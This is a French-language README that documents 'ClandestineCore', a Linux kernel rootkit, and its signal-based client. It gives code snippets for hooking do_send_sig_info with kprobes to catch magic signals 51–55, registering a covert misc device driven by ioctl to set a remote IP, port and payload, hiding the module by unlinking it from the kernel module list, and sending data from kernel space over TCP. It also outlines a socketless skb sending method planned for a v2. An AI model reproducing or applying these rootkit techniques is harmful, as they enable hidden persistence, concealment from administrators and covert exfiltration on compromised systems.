![KNX-CA Windows Logo](assets/ClandestinLogo.png)
# ClandestineDoc for ClandestineCore
> Un super Rootkit kernel !

[![Language](https://img.shields.io/badge/ClandestineCore-C-blue.svg)](https://google.fr/)


### Fonctionnalités 
--- 
#### SIGCATCH
Un Hook kprobe (pre_handler) permettant de s'attacher un appel système kernel, en l'occurence `do_send_sig_info`. 

le module enregistre en premier lieu de hook via : 
```c 
static struct kprobe kp = {
    .symbol_name = "do_send_sig_info",
};
[...]
static int __init ClandestineCore_init(void)
{
    pr_info("ClandestineCore: Module loaded\n");
    kp.pre_handler = SIGCATCH;
    return register_kprobe(&kp);
}
[...]
module_init(ClandestineCore_init);
```

Pourquoi do_send_sig_info ? \
Dans la hiérarchie de l'appel kill : 
- kill(...) &nbsp;&nbsp;&nbsp;&nbsp;-> `return __sysret(sys_kill(pid, signal));` 
- sys_kill(..) &nbsp;-> `return my_syscall2(__NR_kill, pid, signal);`
- __NR_kill &nbsp;&nbsp;-> `return kill_something_info(sig, &info, pid);`
- kill_something_info :
  - if (pid > 0) : \
    - `kill_proc_info(...)` -> `kill_pid_info(...)` -> `kill_pid_info_type(...)` -> `group_send_sig_info(...)` : `ret = do_send_sig_info(sig, info, p, type);`
  - else : \
    - `group_send_sig_info(...)` : `ret = do_send_sig_info(sig, info, p, type);`


Chaque appel attaché est comparé a une liste d'appel fixée : 
```c
#define SIGALWRECV 51
#define SIGREMRECV 52
#define SIGHIDEMOD 53
#define SIGUNHIDEM 54
#define SIGSENDNET 55
```
Chaque signal est associé à une fonction `k<SIG...>` qui gère une fonction distante.

Les fonctions kprobe on deux arguments : \
`static int (struct kprobe, struct pt_regs)`

`pt_regs` reprend les registres au moment de l'appel du syscall et est défini par : 
```c
struct pt_regs {
        //L'Ordre exact dépend du noyau, mais on y retrouve :
        unsigned long r15;
        unsigned long r14;
        unsigned long r13;
        [...]
        unsigned long ax; // RAX - sert souvent de registre de retour de fonction
        unsigned long cx;
        unsigned long dx; // RDX
        unsigned long si; // RSI
        unsigned long di; // RDI
        unsigned long orig_ax; // Valeur de RAX avant l'appel syscall
        unsigned long ip; // RIP - adresse de l'instruction
        unsigned long cs; // Code segment
        unsigned long flags;
        unsigned long sp; // RSP - stack pointer
        unsigned long ss; // Stack segment
    };
```

Pour rappel sur x86_64 -> `System V AMD64 ABI (Application Binary Interface)` :\
Argv : `RDI(1)`, `RSI(2)`, `RDX(3)`, `RCX(4)`, `R8(5)`, `R9(6)`

Le PID est dans le registre RSI, le signalno est dans le registre RDI.
```c
pid_t pid = regs->si;
int signalno = regs->di;
```

#### kSIGALWRECV
Si le signal envoyé est 51 alors j'enregistre un nouveau device (misc_device) avec `misc_register`

Un misc device est défini par : 
```c
#define DEVICE      "devcc"
[...]
/*
 * miscdevice:
 *   - minor : numéro mineur attribué dynamiquement via MISC_DYNAMIC_MINOR
 *   - name  : nom du device (/dev/<name>)
 *   - fops  : pointeur vers la structure file_operations
 */

static struct miscdevice misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = DEVICE,
    .fops  = &fops,
};
```

Avec les capacités suivantes : 
```c
#include <linux/fs.h>
[...]
/*
 * file_operations:
 *   - owner   : le module qui possède cette structure (THIS_MODULE)
 *   - open    : fonction appelée lors de l'ouverture du device
 *   - release : fonction appelée lors de la fermeture du device
 *   - write   : fonction appelée lors de l'écriture dans le device
 */
static const struct file_operations fops = {
    .owner          = THIS_MODULE,
    .open           = misc_device_open,
    .release        = misc_device_release,
    .unlocked_ioctl = misc_device_ioctl,
};
```
Je traite des 'callbacks' du device plus loin.

#### kSIGREMRECV
Permet uniquement de fermer le device avec un `misc_deregister(&misc_device)`.

#### kSIGHIDEMOD / kSIGUNHIDEM
Pour cacher le module de la liste des modules, j'ai d'abord essayé de comprendre comment fonctionnait l'outil busybox lsmod.

En fait, c'est assez simple, il lit `/proc/modules` tokenise et formate l'affichage selon des conditions. Car c'est ce fichier qui permet d'exporter la liste des modules _(comme /proc/kallsyms pour les symboles kernels)_

J'ai donc regardé comment étais fait insmod (car j'en ai aussi eu besoin pour ClandestineClient) le binaire fait appel à bb_init_module(...) qui ensuite fait appel à init_module !

Qui est défini dans le kernel par : 
`#define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)`

C'est donc le code du syscall `__NR_init_module` qu'il faut regardé ! Mais le syscall fait ensuite appel à `load_module`.

Dans le code de la fonction ([Code (elixir.bootlin.com)](https://elixir.bootlin.com/linux/v6.12.6/source/kernel/module/main.c#L2854)) on comprend que c'est une linked list dont il suffit de sauvegarder les points de références et de modifier le module précédent pour qu'il pointe vers le suivant.

Et pour remettre on remet le module a la suite du previous. Pour ce faire la structure des modules noyaux fait références a l'élément `list`: 
```c
struct module {
	enum module_state state;

	struct list_head list; //Ici la référence a la liste chaînée
	
  char name[MODULE_NAME_LEN];
  [...]

}

struct list_head {
	struct list_head *next, *prev;
};

```
Donc pour supprimé le module je fais : 
```c
save_previous_mod = THIS_MODULE->list.prev; //Sauvegarde du module précédent
list_del(&THIS_MODULE->list);
```
Pour re-ajouter le module : 
```c
list_add(&THIS_MODULE->list, save_previous_mod);
```

#### kSIGSENDNET (v1)
Pour cette partie j'envoie simplement des données via un socket TCP (Donc visible en espace user (e.g wireshark) mais en kernel-space) 
- Création du sock
- Setup de la destination et du payload
- Connect le sock
- Envoi le payload via `kernel_sendmsg()`

`int kernel_sendmsg(struct socket * sock, struct msghdr * msg, struct kvec * vec, size_t num, size_t size)`\
Il y a deux structure à comprendre : 
 - `kvec` -> érquivalent de iovec en user-space permet de definir un buffer I/O de la communication.
    - `iov_base` -> Pointeur vers le buffer à envoyer
    - `iov_len`  -> Taille du buffer a envoyer
 - `msghdr` -> NULL car le socket est déjà connecté à cette étape

TODO (v2): 
- Envoyer le paquet sans utiliser de socket :
    - Obtenir un pointeur vers le net_device correspondant (ex. "eth0") avec dev_get_by_name().
    - Utiliser alloc_skb() en réservant suffisamment d'espace pour les en-têtes et les données (payload).
    - Construire les en-têtes
        - En-tête Ethernet (si nécessaire, ou laissé à la couche de liaison selon le contexte)
        - En-tête IP
        - En-tête UDP/TCP
        - Remplir les champs nécessaires (version, longueur totale, adresses, checksum, etc.).

- Recopier la charge utile dans la zone de données du sk_buff.
- Définir skb->dev et appeler dev_queue_xmit(skb).
- Utiliser dev_put() pour relâcher le net_device et gérer les erreurs.

### Devices

Pour rappel, la structure du device enregistré est (en partie) définie par :
```c
static const struct file_operations fops = {
    .owner          = THIS_MODULE,
    .open           = misc_device_open,
    .release        = misc_device_release,
    .unlocked_ioctl = misc_device_ioctl,
};
```

#### misc_device_open / misc_device_release

Permet de gérer les conflits d'ouverture et de fermeture du device.

#### misc_device_ioctl

Le device est à l'écoute pour un IOCTL. Les données IOCTL sont envoyées avec une structure définie comme ci-dessous : 
```c
struct ioctl_data {
    size_t size; 
    char buffer[IOCTL_BUFF_SIZE];
};
```

Cela me permet d'envoyer des données de tailles variables, en effectuant un kmalloc relatif au buffer, malgré le fait que les données transmises proviennent de l'espace user (__\_\_user *__).

L'ID de l'IOCTL est passé en argument de la fonction :  `cmd`.

*static long misc_device_ioctl(struct file *file, unsigned int __cmd__, unsigned long arg)* 

Donc, selon la valeur de `cmd` qui attend une de ces valeurs : 
```c
#define IOCTL_IP    0x100
#define IOCTL_PORT  0x200
#define IOCTL_DATA  0x300
```
Une fonctionnalité differente sera, effectuée.
- *IOCTL_IP* : Récupère l'IP passé en argument de l'IOCTL et popule rHost
- *IOCTL_PORT* : Même chose mais pour le port
- *IOCTL_DATA* : Même chose mais pour les donnée du payload

---
##### References :


- kill() : _https://elixir.bootlin.com/linux/v6.12.6/source/tools/include/nolibc/sys.h#L560_
- sys_kill() : _https://elixir.bootlin.com/linux/v6.12.6/source/tools/include/nolibc/sys.h#L554_
- __NR_kill : _https://elixir.bootlin.com/linux/v6.12.6/source/kernel/signal.c#L3834_
- kill_something_info : _https://elixir.bootlin.com/linux/v6.12.6/source/kernel/signal.c#L1603_
- struct task_strcut : _https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/sched.h#L785_
- lsmod : _https://github.com/brgl/busybox/blob/master/modutils/lsmod.c_
- misc_device : _https://embetronicx.com/tutorials/linux/device-drivers/misc-device-driver/_
- IOCTL : _https://embetronicx.com/tutorials/linux/device-drivers/ioctl-tutorial-in-linux/_
- init_module : _https://elixir.bootlin.com/busybox/1.27.2/source/modutils/modprobe-small.c#L29_
- syscalls (1): _https://github.com/torvalds/linux/blob/master/include/linux/syscalls.h_
- syscalls (2) : _https://elixir.bootlin.com/linux/v3.8/source/arch/arm/include/uapi/asm/unistd.h#L157_
- struct module : _https://elixir.bootlin.com/linux/v6.12.6/source/include/linux/module.h#L408_
- kernel_sendmsg : _https://www.kernel.org/doc/html/v5.6/networking/kapi.html#c.kernel_sendmsg_

- https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c

signaux :
  - https://stackoverflow.com/questions/2485028/signal-handling-in-c
  - https://github.com/torvalds/linux/blob/master/include/linux/syscalls.h

modules : 
  - https://github.com/brgl/busybox/blob/master/modutils/modinfo.c

---
# ClandestinClient
Un super client pour un super rootkit kernel !

Le client/launcher va créer un handler pour les signaux : 
```c
#define SIGALWRECV 51
#define SIGREMRECV 52
#define SIGHIDEMOD 53
#define SIGUNHIDEM 54
#define SIGSENDNET 55
```
Chaque signal sera alors intércepté par le rootkit, et chaque signal correspons a une actions détaillé prcédement dans le rootkit. 
Les différentes fonctionnalités lié a ces signaux ne sont donc pas effetuer par le laucher, le handle redirige vers une fonction vide : 
```c
void signal_handler(int signum) {
}

void setup_signal_handlers(void) {
    struct sigaction sa;
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    for (int sig = SIGALWRECV; sig <= SIGSENDNET; sig++) {
        if (sigaction(sig, &sa, NULL) < 0) {
            perror("sigaction");
        }
    }
}
```

Pour la suite des fonctionnalité, 

# Credits : 
- absel.exe